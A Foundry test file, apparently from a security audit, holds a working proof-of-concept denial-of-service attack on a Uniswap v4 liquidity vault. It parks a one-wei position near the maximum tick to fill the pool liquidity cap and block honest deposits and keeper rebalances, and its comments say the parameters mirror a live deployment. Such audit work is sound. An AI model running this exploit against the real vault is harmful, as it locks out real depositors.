// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test, console2} from "forge-std/Test.sol";
import {Deployers} from "@uniswap/v4-core/test/utils/Deployers.sol";
import {IHooks} from "v4-core/interfaces/IHooks.sol";
import {PoolKey} from "v4-core/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "v4-core/types/PoolId.sol";
import {Currency} from "v4-core/types/Currency.sol";
import {ModifyLiquidityParams} from "v4-core/types/PoolOperation.sol";
import {LPFeeLibrary} from "v4-core/libraries/LPFeeLibrary.sol";
import {StateLibrary} from "v4-core/libraries/StateLibrary.sol";
import {TickMath} from "v4-core/libraries/TickMath.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";
import {MoleHook} from "../../src/MoleHook.sol";
import {MolePositions} from "../../src/MolePositions.sol";
import {HookPermissions} from "../../src/config/HookPermissions.sol";
import {deployMoleVault, hookProxyArgs, TEST_UPGRADE_ADMIN} from "../helpers/ProxyDeploy.sol";

/// @title AttackAggregateCapDoS
/// @notice THE AGGREGATE DOMINANCE CAP (F-07 mechanism D's fix) IS A DEPOSIT KILL SWITCH ANYONE CAN PULL.
///
/// `maxPoolLiquidity` bounds `poolLiquidity[pid]`, a running sum of the LIQUIDITY NUMBER L. L is not a
/// quantity of money: the tokens a given L costs depend entirely on the range's width and its distance
/// from spot, and BOTH are chosen freely by the depositor. `_validateRange` bounds the WIDTH and nothing
/// bounds the DISTANCE, so a range parked next to MAX_TICK buys an unbounded L for one raw token unit.
///
/// Consequence, measured below on the LIVE Robinhood 4663 policy (maxPoolLiquidity = 1.2e18,
/// minRangeWidth = 120, maxRangeWidth = 120_000, tickSpacing = 60, position size band disabled): one
/// permissionless `open` for ONE WEI consumes the entire pool ceiling, after which every honest `open`
/// and `zapOpen` into that pool reverts `PoolTooLarge` for as long as the attacker keeps the position.
contract AttackAggregateCapDoS is Test, Deployers {
    using PoolIdLibrary for PoolKey;

    address internal KEEPER = makeAddr("cap.keeper");
    address internal alice = makeAddr("cap.alice");
    address internal bob = makeAddr("cap.bob");
    address internal mallory = makeAddr("cap.mallory");
    address internal treasury = makeAddr("cap.treasury");

    // LIVE ROBINHOOD 4663 POLICY, read from the proxy at 0x674625B6… on 2026-08-24.
    int24 internal constant SPACING = 60;
    int24 internal constant MIN_W = 120; // minRangeWidth()
    int24 internal constant MAX_W = 120_000; // maxRangeWidth()
    uint128 internal constant POOL_CAP = 1_200_000_000_000_000_000; // maxPoolLiquidity() = 1.2e18
    int24 internal constant DEV = 600; // maxTwapDeviationTicks()
    uint32 internal constant WINDOW = 300;

    // The parking spot: the highest legal range on a 60-spacing pool. 887220 = 14787 * 60 <= MAX_TICK.
    int24 internal constant PARK_UPPER = 887_220;
    int24 internal constant PARK_LOWER = 887_100; // width 120 == minRangeWidth

    uint256 internal _clock;
    uint256 internal _height;

    function _advance(uint256 secs) internal {
        _clock += secs;
        _height += 1 + secs / 12;
        vm.warp(_clock);
        vm.roll(_height);
    }

    function setUp() public {
        _clock = 1_750_000_000;
        _height = 21_000_000;
        vm.warp(_clock);
        vm.roll(_height);
        deployFreshManagerAndRouters();
        (currency0, currency1) = deployMintAndApprove2Currencies();
        _fund(alice);
        _fund(bob);
        _fund(mallory);
    }

    function _fund(address who) internal {
        MockERC20(Currency.unwrap(currency0)).mint(who, 100_000_000e18);
        MockERC20(Currency.unwrap(currency1)).mint(who, 100_000_000e18);
    }

    function _approve(address who, address spender) internal {
        vm.startPrank(who);
        MockERC20(Currency.unwrap(currency0)).approve(spender, type(uint256).max);
        MockERC20(Currency.unwrap(currency1)).approve(spender, type(uint256).max);
        vm.stopPrank();
    }

    function _hookAddr(uint256 seed) internal pure returns (address) {
        uint160 high = uint160(uint256(keccak256(abi.encode("cap.dos", seed)))) & ~HookPermissions.ALL_HOOK_MASK;
        return address(high | HookPermissions.REQUIRED_FLAGS);
    }

    function _world(uint256 seed) internal returns (MoleHook h, PoolKey memory k) {
        address a = _hookAddr(seed);
        deployCodeTo(
            "ERC1967Proxy.sol:ERC1967Proxy",
            hookProxyArgs(manager, address(this), uint24(3000), uint32(60), false, uint24(0), treasury, address(this)),
            a
        );
        h = MoleHook(a);
        k = PoolKey({
            currency0: currency0,
            currency1: currency1,
            fee: LPFeeLibrary.DYNAMIC_FEE_FLAG,
            tickSpacing: SPACING,
            hooks: IHooks(a)
        });
        manager.initialize(k, SQRT_PRICE_1_1);
        modifyLiquidityRouter.modifyLiquidity(
            k,
            ModifyLiquidityParams({tickLower: -60_000, tickUpper: 60_000, liquidityDelta: 20e18, salt: 0}),
            ZERO_BYTES
        );
        _advance(WINDOW + 1);
    }

    function _vault(MoleHook h, PoolKey memory k) internal returns (MolePositions m) {
        m = deployMoleVault(
            manager, KEEPER, 1 hours, MIN_W, MAX_W, address(h), DEV, WINDOW, 0, 10, 7_500, 600, 1000, treasury
        );
        m.whitelistPool(k);
        // The live posture: the aggregate ceiling ON, the per-position band OFF.
        vm.prank(TEST_UPGRADE_ADMIN);
        m.setPoolLiquidityCap(POOL_CAP);
    }

    function _bal(address who) internal view returns (uint256 b0, uint256 b1) {
        b0 = MockERC20(Currency.unwrap(currency0)).balanceOf(who);
        b1 = MockERC20(Currency.unwrap(currency1)).balanceOf(who);
    }

    /* ================================================================================================ */

    /// @notice THE ATTACK. One `open`, one wei, and the vault stops accepting deposits into that pool.
    function test_BREAK_oneWeiAtTheTopOfTheTickRangeExhaustsTheWholePoolCeiling() public {
        (MoleHook h, PoolKey memory k) = _world(1);
        MolePositions m = _vault(h, k);
        _approve(alice, address(m));
        _approve(bob, address(m));
        _approve(mallory, address(m));

        // An honest depositor first, so the pool is a going concern.
        vm.prank(alice);
        uint256 aliceId = m.open(k, -600, 600, 1e16, type(uint256).max, type(uint256).max, _clock + 1);
        uint256 used = m.poolLiquidity(k.toId());
        assertEq(used, 1e16, "premise: the counter follows an honest deposit");

        // MALLORY. One position, at the highest legal range on this pool, sized to eat every remaining
        // unit of the ceiling. Nothing in `open` looks at where the range SITS relative to spot.
        uint128 grab = POOL_CAP - uint128(used);
        (uint256 m0Before, uint256 m1Before) = _bal(mallory);
        vm.prank(mallory);
        uint256 malloryId =
            m.open(k, PARK_LOWER, PARK_UPPER, grab, type(uint256).max, type(uint256).max, _clock + 1);
        (uint256 m0After, uint256 m1After) = _bal(mallory);

        uint256 cost0 = m0Before - m0After;
        uint256 cost1 = m1Before - m1After;
        console2.log("liquidity claimed by mallory (L)", uint256(grab));
        console2.log("currency0 paid (raw units)      ", cost0);
        console2.log("currency1 paid (raw units)      ", cost1);
        assertEq(uint256(m.poolLiquidity(k.toId())), uint256(POOL_CAP), "the ceiling is not full");

        // THE PRICE OF THE KILL SWITCH. Not "cheap" — one raw unit of one token and nothing of the other.
        assertLe(cost0, 4, "the parked position cost more than a handful of raw units");
        assertEq(cost1, 0, "the parked position should be entirely one-sided");

        // THE CONTROL, so the number above is a measurement rather than a claim: the SAME L bought at
        // spot, on the range an honest depositor would pick.
        uint256 honest0 = _costAtSpot(k, grab);
        console2.log("same L at spot would have cost  ", honest0);
        assertGt(honest0 / (cost0 + 1), 1_000_000, "the parked range is not orders of magnitude cheaper");

        // THE HARM. Every honest deposit into this pool is now refused, by the cap's own error.
        vm.prank(bob);
        vm.expectRevert(MolePositions.PoolTooLarge.selector);
        m.open(k, -600, 600, 1e15, type(uint256).max, type(uint256).max, _clock + 1);

        // Not even one unit of liquidity gets in.
        vm.prank(bob);
        vm.expectRevert(MolePositions.PoolTooLarge.selector);
        m.open(k, -600, 600, 1, type(uint256).max, type(uint256).max, _clock + 1);

        // And it does not time out: the counter only moves on deposits and burns.
        _advance(30 days);
        vm.prank(bob);
        vm.expectRevert(MolePositions.PoolTooLarge.selector);
        m.open(k, -600, 600, 1e15, type(uint256).max, type(uint256).max, _clock + 1);

        // WHO HOLDS THE SWITCH. Only mallory (or the root key). Exits are unblockable, so alice can still
        // leave — and every unit of room her exit frees is re-parked for ANOTHER single wei, so the
        // ceiling stays full for as long as mallory keeps topping it up at a raw unit a time.
        vm.prank(alice);
        m.withdrawAll(aliceId);
        uint128 room = POOL_CAP - m.poolLiquidity(k.toId());
        assertEq(uint256(room), 1e16, "the exit did not free exactly what it deposited");

        (uint256 t0Before,) = _bal(mallory);
        vm.prank(mallory);
        uint256 topUpId = m.open(k, PARK_LOWER, PARK_UPPER, room, type(uint256).max, type(uint256).max, _clock + 1);
        (uint256 t0After,) = _bal(mallory);
        console2.log("re-parking the freed room cost ", t0Before - t0After);
        assertLe(t0Before - t0After, 4, "the top-up cost more than a handful of raw units");

        vm.prank(bob);
        vm.expectRevert(MolePositions.PoolTooLarge.selector);
        m.open(k, -600, 600, 1e15, type(uint256).max, type(uint256).max, _clock + 1);

        // The switch is released only when the attacker chooses, or by the root key.
        vm.prank(mallory);
        m.withdrawAll(malloryId);
        vm.prank(mallory);
        m.withdrawAll(topUpId);
        vm.prank(bob);
        m.open(k, -600, 600, 1e15, type(uint256).max, type(uint256).max, _clock + 1);
    }

    /// @notice The same lever also stops the KEEPER re-minting, because the rebalance branch runs the
    ///         aggregate ceiling on the liquidity the re-mint derives.
    function test_BREAK_aParkedPositionAlsoBlocksTheKeepersReMint() public {
        (MoleHook h, PoolKey memory k) = _world(2);
        MolePositions m = _vault(h, k);
        _approve(alice, address(m));
        _approve(mallory, address(m));

        vm.prank(alice);
        uint256 aliceId = m.open(k, -6000, 6000, 1e16, type(uint256).max, type(uint256).max, _clock + 1);

        uint128 grab = POOL_CAP - m.poolLiquidity(k.toId());
        vm.prank(mallory);
        m.open(k, PARK_LOWER, PARK_UPPER, grab, type(uint256).max, type(uint256).max, _clock + 1);

        _advance(2 days);

        // A narrowing recentre inside every keeper bound. The re-mint derives MORE L from the same tokens,
        // and the aggregate ceiling — full — refuses it.
        vm.prank(KEEPER);
        vm.expectRevert(MolePositions.PoolTooLarge.selector);
        m.rebalance(aliceId, -5400, 5400);
    }

    /// @dev What the same L would have cost on an at-spot range, priced by the pool itself.
    function _costAtSpot(PoolKey memory k, uint128 liq) internal returns (uint256 spent0) {
        (uint256 b0,) = _bal(address(this));
        modifyLiquidityRouter.modifyLiquidity(
            k,
            ModifyLiquidityParams({
                tickLower: -600,
                tickUpper: 600,
                liquidityDelta: int256(uint256(liq)),
                salt: bytes32(uint256(0xdeadbeef))
            }),
            ZERO_BYTES
        );
        (uint256 a0,) = _bal(address(this));
        spent0 = b0 - a0;
        modifyLiquidityRouter.modifyLiquidity(
            k,
            ModifyLiquidityParams({
                tickLower: -600,
                tickUpper: 600,
                liquidityDelta: -int256(uint256(liq)),
                salt: bytes32(uint256(0xdeadbeef))
            }),
            ZERO_BYTES
        );
    }
}
